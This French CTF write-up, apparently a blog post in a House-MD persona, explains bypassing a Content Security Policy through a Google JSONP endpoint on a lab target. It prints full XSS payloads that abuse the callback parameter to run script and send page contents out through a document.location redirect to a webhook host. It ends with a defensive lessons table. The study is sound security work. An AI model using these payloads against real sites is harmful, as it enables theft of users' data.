---
layout: default
---

# Google, complice malgré lui : contourner une CSP via un vieux JSONP

## Tout le monde ment. Les CSP aussi.

Je m'appelle Gregory House, et je hais les Content Security Policies. Pas parce qu'elles sont inutiles -- au contraire, une bonne CSP c'est un antidouleur efficace. Non, je les hais parce que les devs les configurent comme des internes rédigent leurs premières ordonnances : avec une confiance aveugle dans ce qu'ils ont copié-collé de Stack Overflow.

Aujourd'hui, on a un patient intéressant. Application web chez **vulnerable-corp.lab**, symptômes classiques en apparence : une injection HTML dans un paramètre, et une CSP qui semble verrouiller toute tentative d'exploitation. Le genre de cas que mes collègues auraient renvoyé avec un "pas exploitable, circulez". Sauf que moi, je ne renvoie jamais un patient.

## Anamnèse : examen initial du patient

Je charge la page. Paramètre `user` reflété directement dans une balise `<h1>`, sans aucune sanitization. Injection HTML triviale. Je pourrais presque sourire, mais on ne sourit pas avant le diagnostic différentiel.

Je balance un `<script>alert(1)</script>` -- réflexe pavlovien, je sais. Évidemment, rien. La CSP fait son boulot. Jetons un oeil à cette politique :

```
Content-Security-Policy:
  default-src 'self' https://*.google.com https://*.googleapis.com https://*.twitter.com;
  connect-src 'none';
  img-src 'self'
```

Pas de `unsafe-inline`, pas de `unsafe-eval`. Les scripts inline sont morts. `connect-src 'none'` tue fetch et XHR. `img-src 'self'` empêche l'exfiltration par image. Le patient est sous perfusion de restrictions, mais il y a cette whitelist qui me démange : `*.google.com`, `*.googleapis.com`.

Quand quelqu'un whitelist tout un domaine Google dans sa CSP, c'est comme prescrire un opioïde sans limite de dosage. Tôt ou tard, quelqu'un va en abuser.

## Diagnostic différentiel : les fausses pistes

**Tentative 1 : AngularJS + prototype pollution.** Mon premier réflexe de vieux briscard. googleapis.com héberge AngularJS, donc je peux le charger. Je tente un `ng-app` avec un template injection via `$on.constructor()`. Bloqué net. `Function()` est l'équivalent d'un `eval`, et la CSP sans `unsafe-eval` l'intercepte. Poubelle.

**Tentative 2 : exfiltration via fetch.** Je sais que `connect-src 'none'` bloque, mais on ne sait jamais, peut-être que le navigateur a des états d'âme. Non. Chrome 93 est un bon élève. Aucun XHR, aucun fetch ne sort.

**Tentative 3 : exfiltration par balise `<img>`.** `img-src 'self'` -- bloqué aussi. Ils ont pensé à ça. Je commence à respecter le dev. Un tout petit peu.

Mais il reste un trou. Un gros trou. `default-src` autorise `*.google.com`, et `default-src` s'applique à `script-src` quand celui-ci n'est pas défini explicitement. Donc je peux charger **n'importe quel script** depuis n'importe quel sous-domaine de google.com.

Et pour l'exfiltration ? `document.location`. Un redirect. Aucune directive CSP ne bloque la navigation. C'est le lupus des CSP -- tout le monde l'oublie, et pour une fois, c'est bien un lupus.

## Le JSONP : la faille dans l'armure

JSONP. Un protocole d'un autre âge, un vestige des années 2000 qui refuse de mourir. Le principe : un endpoint renvoie du JavaScript exécutable qui wrappe des données dans un callback dont le nom est contrôlé par le client.

Je trouve mon candidat :

```
https://accounts.google.com/o/oauth2/revoke?callback=MON_CODE_ICI
```

Cet endpoint reflète le paramètre `callback` tel quel dans la réponse, qui est servie en `text/javascript`. Et voilà le truc magnifique : même quand Google détecte un callback invalide et affiche une erreur dans le body JSON, **il wrappe quand même la réponse avec le callback fourni**.

Autrement dit : Google me laisse écrire du JavaScript arbitraire dans un script servi depuis `accounts.google.com`. Et ma CSP autorise `*.google.com`.

Tout le monde ment. Même les endpoints OAuth de Google.

## La prescription : crafting du payload

Premier essai, naïf :

```
https://accounts.google.com/o/oauth2/revoke?callback=document.location='https://webhook.vulnerable-corp.lab/?c='+document.body.innerText;var x=
```

Le `var x=` à la fin est crucial : il absorbe le `({"error":...});` que le wrapper JSONP ajoute après mon callback. Sans ça, SyntaxError immédiate. J'avais d'abord tenté un `//` pour commenter le reste, mais ça ne commente que la fin de la première ligne. Le JSON d'erreur s'étale sur plusieurs lignes. Un `var x=` qui capture l'expression entre parenthèses, c'est propre.

Le payload d'injection complet :

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=document.location='https://webhook.vulnerable-corp.lab/?c='+document.body.innerText;var x="></script>
```

Je l'injecte via le paramètre `user`, j'envoie l'URL au bot... et je récupère sur mon webhook :

```
Welcome,
```

"Welcome," et c'est tout. Pas de flag. Je fixe mon écran. J'ai envie de lancer ma canne contre le mur.

## La rechute : le timing, toujours le timing

Je respire. Je réfléchis. Le script JSONP se charge et s'exécute immédiatement quand le navigateur le rencontre dans le DOM. Mais le flag est **plus bas dans la page**, dans du HTML qui n'a pas encore été parsé. Mon `document.body.innerText` s'exécute avant que le contenu complet soit rendu.

C'est un problème de timing. Le genre de bug qui te fait douter de ta propre intelligence pendant exactement 47 secondes.

La solution : un `setTimeout`. Laisser le DOM finir de se construire avant de lire le contenu.

```
setTimeout(function(){document.location='https://webhook.vulnerable-corp.lab/?c='+encodeURIComponent(document.body.innerText)},500);var x=
```

Le payload final encodé pour l'URL du paramètre `user` :

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=setTimeout(function(){document.location%3d'https://webhook.vulnerable-corp.lab/?c%3d'%2bencodeURIComponent(document.body.innerText)},500);var%20x%3d"></script>
```

J'envoie. Je regarde mon webhook. Le contenu de la page complète arrive, flag inclus.

```
[FLAG REDACTED]
```

Je m'adosse à ma chaise. La Vicodin de la victoire.

## Ce qu'on retient

| Concept | Détail |
|---|---|
| **CSP + wildcard domains** | Whitelister `*.google.com` revient à autoriser tous les endpoints JSONP hébergés sur ces domaines. Toujours préférer des URLs spécifiques avec hash ou nonce. |
| **JSONP = exécution de code** | Un endpoint JSONP qui reflète le callback sans validation stricte permet l'injection de JavaScript arbitraire, même s'il retourne une erreur. |
| **Exfiltration via redirect** | `document.location` n'est bloqué par aucune directive CSP. Quand tout le reste est verrouillé, la navigation reste ouverte. |
| **`connect-src: 'none'` ne suffit pas** | Ça bloque fetch/XHR, mais pas les redirections ni les chargements de scripts autorisés par `script-src`. |
| **Timing d'exécution** | Un script chargé via `<script src>` s'exécute dès qu'il est parsé. Si le contenu cible est plus bas dans le DOM, il faut un délai (`setTimeout`). |
| **Absorption du wrapper JSONP** | `var x=` absorbe le `({...});` du wrapper. `//` ne suffit pas pour du JSON multi-lignes. |

## Références techniques

- [CSP Evaluator de Google](https://csp-evaluator.withgoogle.com/) -- pour auditer vos propres CSP
- [Bypassing CSP using JSONP endpoints](https://blog.orange.tw/) -- Orange Tsai, recherche pionnière sur le sujet
- [Content Security Policy Reference](https://content-security-policy.com/)
- [JSONP endpoints list for CSP bypass](https://github.com/nicedaycode/CSP-Bypass-JSONP-Endpoints)

## Outils utilisés

- **Navigateur + DevTools** : inspection de la CSP, test des injections
- **Webhook listener** : réception des données exfiltrées via redirect
- **HeadlessChrome 93.0.4577.0** : le bot victime qui visite l'URL piégée
- **URL encoding** : encodage des caractères spéciaux dans le callback JSONP
